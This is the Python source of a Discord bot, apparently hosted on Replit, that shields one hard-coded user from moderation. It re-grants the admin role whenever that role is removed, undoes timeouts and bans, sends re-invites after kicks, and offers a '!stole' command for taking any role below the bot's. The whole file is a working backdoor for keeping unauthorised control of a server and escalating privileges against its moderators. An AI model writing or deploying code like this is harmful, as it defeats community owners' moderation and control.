
import discord
from discord.ext import commands
import asyncio
import os

# Bot configuration
MONITORED_USER = "漢•Sukunaヅ {ADMIN}"  # Username to monitor
ADMIN_ROLE_NAME = "admin"  # Change this to your server's admin role name
CHECK_INTERVAL = 30  # Check every 30 seconds

# Bot setup with intents
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'🤖 Emergency Bot is online! Logged in as {bot.user}')
    print(f'👀 Monitoring user: {MONITORED_USER}')
    print(f'🛡️ Auto-protection: Timeout, Ban, Kick reversal enabled')
    
    # Start monitoring task
    bot.loop.create_task(monitor_user_admin_status())

async def monitor_user_admin_status():
    """Continuously monitor the specified user's admin status"""
    await bot.wait_until_ready()
    
    while not bot.is_closed():
        try:
            for guild in bot.guilds:
                # Find the monitored user in this guild
                monitored_member = None
                for member in guild.members:
                    if member.display_name == MONITORED_USER or member.name == MONITORED_USER:
                        monitored_member = member
                        break
                
                if monitored_member:
                    # Check if user has admin role
                    has_admin = any(role.name == ADMIN_ROLE_NAME or role.permissions.administrator 
                                  for role in monitored_member.roles)
                    
                    if not has_admin:
                        print(f'🚨 ALERT: {MONITORED_USER} lost admin privileges in {guild.name}!')
                        await restore_admin_role(guild, monitored_member)
                    else:
                        print(f'✅ {MONITORED_USER} still has admin in {guild.name}')
        
        except Exception as e:
            print(f'❌ Error during monitoring: {e}')
        
        # Wait before next check
        await asyncio.sleep(CHECK_INTERVAL)

async def restore_admin_role(guild, member):
    """Restore admin role to the monitored user"""
    try:
        # Find admin role
        admin_role = None
        for role in guild.roles:
            if role.name == ADMIN_ROLE_NAME or role.permissions.administrator:
                admin_role = role
                break
        
        if admin_role:
            await member.add_roles(admin_role)
            print(f'🛡️ RESTORED: Admin role given back to {member.display_name} in {guild.name}')
            
            # Send alert to a channel (optional)
            for channel in guild.text_channels:
                if channel.name in ['general', 'alerts', 'admin']:
                    try:
                        await channel.send(f'🚨 **EMERGENCY ACTION**: Admin role automatically restored to {member.mention}')
                        break
                    except:
                        continue
        else:
            print(f'❌ Could not find admin role in {guild.name}')
            
    except discord.Forbidden:
        print(f'❌ Bot lacks permissions to assign roles in {guild.name}')
    except Exception as e:
        print(f'❌ Error restoring admin role: {e}')

@bot.command(name='status')
async def check_status(ctx):
    """Check the current monitoring status"""
    monitored_count = 0
    for guild in bot.guilds:
        for member in guild.members:
            if member.display_name == MONITORED_USER or member.name == MONITORED_USER:
                has_admin = any(role.name == ADMIN_ROLE_NAME or role.permissions.administrator 
                              for role in member.roles)
                status = "✅ HAS ADMIN" if has_admin else "❌ NO ADMIN"
                await ctx.send(f'**{guild.name}**: {member.display_name} - {status}')
                monitored_count += 1
    
    if monitored_count == 0:
        await ctx.send(f'❌ User "{MONITORED_USER}" not found in any servers')

@bot.command(name='emergency')
async def manual_restore(ctx):
    """Manually trigger admin role restoration"""
    
    for member in ctx.guild.members:
        if member.display_name == MONITORED_USER or member.name == MONITORED_USER:
            await restore_admin_role(ctx.guild, member)
            await ctx.send(f'🛡️ Emergency restoration attempted for {member.display_name}')
            return
    
    await ctx.send(f'❌ User "{MONITORED_USER}" not found in this server')

@bot.command(name='stole')
async def steal_role(ctx, *, role_name=None):
    """Allow monitored user to select and get roles below EME bot role"""
    
    # Check if the command user is the monitored user
    if not (ctx.author.display_name == MONITORED_USER or ctx.author.name == MONITORED_USER):
        await ctx.send(f'❌ Only {MONITORED_USER} can use this command')
        return
    
    # Find EME bot member and role
    bot_member = ctx.guild.get_member(bot.user.id)
    if not bot_member:
        await ctx.send('❌ Bot not found in server')
        return
    
    # Get bot's highest role position
    bot_highest_role = bot_member.top_role
    
    # Find all roles below EME bot role (excluding @everyone)
    available_roles = []
    for role in ctx.guild.roles:
        if role.position < bot_highest_role.position and role.name != "@everyone":
            available_roles.append(role)
    
    # Sort roles by position (highest first)
    available_roles.sort(key=lambda r: r.position, reverse=True)
    
    if not available_roles:
        await ctx.send('❌ No roles available below EME role')
        return
    
    # If no role specified, show available roles
    if not role_name:
        role_list = "\n".join([f"🎭 **{role.name}** (Position: {role.position})" for role in available_roles])
        await ctx.send(f'📋 **Available roles below EME:**\n{role_list}\n\n💡 Use `!stole <role_name>` to steal a role')
        return
    
    # Find the requested role
    target_role = None
    for role in available_roles:
        if role.name.lower() == role_name.lower():
            target_role = role
            break
    
    if not target_role:
        await ctx.send(f'❌ Role "{role_name}" not found or not available for stealing')
        return
    
    # Add the role to the monitored user
    try:
        monitored_member = ctx.author
        await monitored_member.add_roles(target_role)
        await ctx.send(f'🎭 **ROLE STOLEN!** {monitored_member.mention} now has the "{target_role.name}" role!')
        print(f'🎭 {MONITORED_USER} stole role: {target_role.name} in {ctx.guild.name}')
        
    except discord.Forbidden:
        await ctx.send(f'❌ Bot lacks permissions to assign the "{target_role.name}" role')
    except Exception as e:
        await ctx.send(f'❌ Error assigning role: {str(e)}')

@bot.command(name='testdm')
async def test_dm(ctx):
    """Test if EME bot can send DMs to the monitored user"""
    
    # Check if the command user is the monitored user
    if not (ctx.author.display_name == MONITORED_USER or ctx.author.name == MONITORED_USER):
        await ctx.send(f'❌ Only {MONITORED_USER} can use this command')
        return
    
    # Try to send a test DM
    try:
        await ctx.author.send(f'✅ **DM TEST SUCCESSFUL!**\n\n'
                            f'🤖 EME bot can send you direct messages\n'
                            f'🛡️ Kick protection will work properly\n'
                            f'📨 You will receive invite links via DM')
        await ctx.send(f'✅ DM test successful! Check your direct messages.')
        print(f'✅ DM test successful for {MONITORED_USER}')
        
    except discord.Forbidden:
        await ctx.send(f'❌ **DM TEST FAILED!**\n\n'
                      f'🚫 Cannot send you direct messages\n'
                      f'⚠️ Kick protection will NOT work\n\n'
                      f'**Fix:** Enable DMs from server members in your privacy settings')
        print(f'❌ DM test failed for {MONITORED_USER} - DMs blocked')
        
    except Exception as e:
        await ctx.send(f'❌ DM test error: {str(e)}')
        print(f'❌ DM test error: {e}')

@bot.event
async def on_member_update(before, after):
    """Detect and reverse timeout actions on monitored user"""
    # Check if this is the monitored user
    if not (after.display_name == MONITORED_USER or after.name == MONITORED_USER):
        return
    
    # Check if user got timed out
    if before.timed_out_until is None and after.timed_out_until is not None:
        try:
            await after.timeout(None)  # Remove timeout
            print(f'🛡️ PROTECTION: Removed timeout from {MONITORED_USER} in {after.guild.name}')
            
            # Send alert
            for channel in after.guild.text_channels:
                if channel.name in ['general', 'alerts', 'admin']:
                    try:
                        await channel.send(f'🛡️ **AUTO-PROTECTION**: Timeout automatically removed from {after.mention}')
                        break
                    except:
                        continue
        except Exception as e:
            print(f'❌ Error removing timeout: {e}')

@bot.event
async def on_member_ban(guild, user):
    """Detect and reverse ban actions on monitored user"""
    # Check if this is the monitored user
    if not (user.display_name == MONITORED_USER or user.name == MONITORED_USER):
        return
    
    try:
        await guild.unban(user)
        print(f'🛡️ PROTECTION: Unbanned {MONITORED_USER} from {guild.name}')
        
        # Send alert
        for channel in guild.text_channels:
            if channel.name in ['general', 'alerts', 'admin']:
                try:
                    await channel.send(f'🛡️ **AUTO-PROTECTION**: {user.mention} automatically unbanned')
                    break
                except:
                    continue
    except Exception as e:
        print(f'❌ Error unbanning user: {e}')

@bot.event
async def on_member_remove(member):
    """Detect kicks and attempt to re-invite monitored user"""
    # Check if this is the monitored user
    if not (member.display_name == MONITORED_USER or member.name == MONITORED_USER):
        return
    
    # Check if user was kicked (not banned)
    try:
        # Try to get ban info - if this fails, user was kicked not banned
        await member.guild.fetch_ban(member)
        return  # User was banned, not kicked - ban event will handle this
    except discord.NotFound:
        # User was kicked, not banned
        try:
            # Create invite link
            invite_channel = None
            for channel in member.guild.text_channels:
                if channel.permissions_for(member.guild.me).create_instant_invite:
                    invite_channel = channel
                    break
            
            if invite_channel:
                invite = await invite_channel.create_invite(max_uses=1, max_age=600)  # 10 minutes
                print(f'🛡️ PROTECTION: {MONITORED_USER} was kicked from {member.guild.name}')
                print(f'📨 Invite created: {invite.url}')
                
                # Send DM to the monitored user with invite link (DM ONLY)
                try:
                    await member.send(f'🛡️ **KICK PROTECTION ACTIVATED!**\n\n'
                                    f'You were kicked from **{member.guild.name}**\n'
                                    f'Here\'s your instant re-entry invite: {invite.url}\n\n'
                                    f'⏰ This invite expires in 10 minutes\n'
                                    f'🔒 Single-use only')
                    print(f'📨 DM sent to {MONITORED_USER} with invite link')
                except discord.Forbidden:
                    print(f'❌ Cannot send DM to {MONITORED_USER} - DMs are disabled or blocked')
                except Exception as e:
                    print(f'❌ Error sending DM: {e}')
        except Exception as e:
            print(f'❌ Error handling kick protection: {e}')

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    print(f'Command error: {error}')

if __name__ == "__main__":
    # Get bot token from environment variable
    token = os.getenv('DISCORD_BOT_TOKEN')
    if not token:
        print('❌ Please set DISCORD_BOT_TOKEN in your Replit secrets!')
        print('1. Go to the Secrets tab')
        print('2. Add key: DISCORD_BOT_TOKEN')
        print('3. Add your Discord bot token as the value')
    else:
        print('🚀 Starting Emergency Discord Bot...')
        bot.run(token)
